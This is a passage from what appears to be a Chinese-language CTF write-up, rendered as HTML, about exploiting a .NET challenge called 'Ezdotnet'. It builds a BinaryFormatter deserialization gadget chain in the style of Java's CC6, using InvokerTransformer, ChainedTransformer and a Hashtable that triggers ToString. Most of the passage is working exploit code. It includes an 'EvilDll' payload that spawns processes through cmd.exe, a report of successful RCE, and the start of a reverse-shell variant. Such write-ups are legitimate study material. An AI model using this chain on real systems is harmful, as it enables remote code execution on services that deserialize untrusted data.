+</span></span><span class="line"><span class="cl">        <span class="k">typeof</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">method1</span> <span class="p">!=</span> <span class="p">(</span><span class="n">MethodInfo</span><span class="p">)</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">method1</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">o</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">methodParam</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">typeName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">MethodInfo</span> <span class="n">method2</span> <span class="p">=</span> <span class="n">type</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">methodName</span><span class="p">,</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">typeof</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">method2</span> <span class="p">==</span> <span class="p">(</span><span class="n">MethodInfo</span><span class="p">)</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">method2</span> <span class="p">=</span> <span class="n">type</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">methodName</span><span class="p">,</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">typeof</span> <span class="p">(</span><span class="kt">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">method2</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">o</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">methodParam</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span> <span class="n">ex</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">throw</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">object</span><span class="p">[]</span> <span class="n">methodParam</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">string</span> <span class="n">methodName</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="n">InvokerTransformer</span><span class="p">[]</span> <span class="n">_transformers</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">string</span> <span class="n">typeName</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>不难看出是要打一个类似CC6的链子，需要利用<code>InvokerTransformer</code>和<code>ChainedTransformer</code>一步步RCE，而最终<code>InvokerTransformer</code>中也是存在反射，我们知道CC6是通过反射加载字节码来RCE，dotnet中也存在类加载，只不过C#中的类编译后会变成dll文件，那么最终可以通过加载dll进行RCE</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">DonNET_Deserialization</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">TEST</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">assembly</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s">&#34;ExpClassa.dll&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">types</span> <span class="p">=</span> <span class="n">assembly</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">types</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>仿照上述写出<code>ChainedTransformer</code>版本</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">invokerTransformer1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer1</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;Load&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer1</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s">&#34;&lt;base64&gt;&#34;</span><span class="p">)};</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer1</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">var</span> <span class="n">invokerTransformer2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer2</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;CreateInstance&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer2</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">invokerTransformer2</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="s">&#34;Exp.Exp&#34;</span> <span class="p">};</span>   
+</span></span><span class="line"><span class="cl"><span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">();</span></span></span></code></pre></div></div><p><code>BadBean</code>中触发点在<code>ToString</code>方法，也就是说需要在反序列化过程中触发<code>ToString</code>方法，在<code>ActivitySurrogateSelector</code>利用链中触发<code>ToString</code>是通过<code>HashTable</code>方法，<code>Hashtable</code>在反序列化的时候会重新建key集合，引发异常的话就会触发<code>ToString</code></p>
+<p>构造Exp如下</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Beans</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Utils</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">Demo</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowAssembliesFromByteArrays&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Data.AllowArbitraryDataSetTypeInstantiation&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">invoker1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;Load&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s">&#34;C:\\Users\\p0l1st\\Desktop\\Ezdotnet\\EzdotnetExp\\EvilDll\\bin\\Debug\\net6.0\\EvilDll.dll&#34;</span><span class="p">)</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">invoker2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;CreateInstance&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="s">&#34;EvilDll.Class1&#34;</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chainedTransformer</span><span class="p">.</span><span class="n">_transformers</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">[]{</span><span class="n">invoker1</span><span class="p">,</span> <span class="n">invoker2</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">badBean</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BadBean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">filed</span> <span class="p">=</span> <span class="n">badBean</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_transformer&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filed</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">badBean</span><span class="p">,</span> <span class="n">chainedTransformer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">ht</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">badBean</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FieldInfo</span> <span class="n">fi_keys</span> <span class="p">=</span> <span class="n">ht</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_buckets&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Array</span> <span class="n">keys</span> <span class="p">=</span> <span class="p">(</span><span class="n">Array</span><span class="p">)</span><span class="n">fi_keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FieldInfo</span> <span class="n">fi_key</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetElementType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">keys</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">object</span> <span class="n">bucket</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">object</span> <span class="n">key</span> <span class="p">=</span> <span class="n">fi_key</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="k">is</span> <span class="kt">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fi_key</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">badBean</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fi_keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="n">keys</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">BinaryFormatter</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="n">binaryData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">ms</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">ms</span><span class="p">,</span> <span class="n">ht</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//binaryData = ms.ToArray();</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">ms</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">formatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">ms</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//string base64String = Convert.ToBase64String(binaryData);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//Console.WriteLine(base64String);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>生成dll</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image%20(3aaa).png' alt="image (3aaa)"></p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">Class1</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class1</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span> <span class="s">&#34;/c calc.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>构建所选项目即可</p>
+<p>运行成功rce</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image%20(3fff).png' alt="image (3fff)"></p>
+<p>修改exp，反弹shell</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Beans</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Utils</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">Demo</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowAssembliesFromByteArrays&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">AppContext</span><span class="p">.</span><span class="n">SetSwitch</span><span class="p">(</span><span class="s">&#34;Switch.System.Data.AllowArbitraryDataSetTypeInstantiation&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">invoker1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;Load&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s">&#34;C:\\Users\\p0l1st\\Desktop\\Ezdotnet\\EzdotnetExp\\EvilDll\\bin\\Debug\\net6.0\\EvilDll.dll&#34;</span><span class="p">)</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker1</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">invoker2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;CreateInstance&#34;</span><span class="p">;</span>
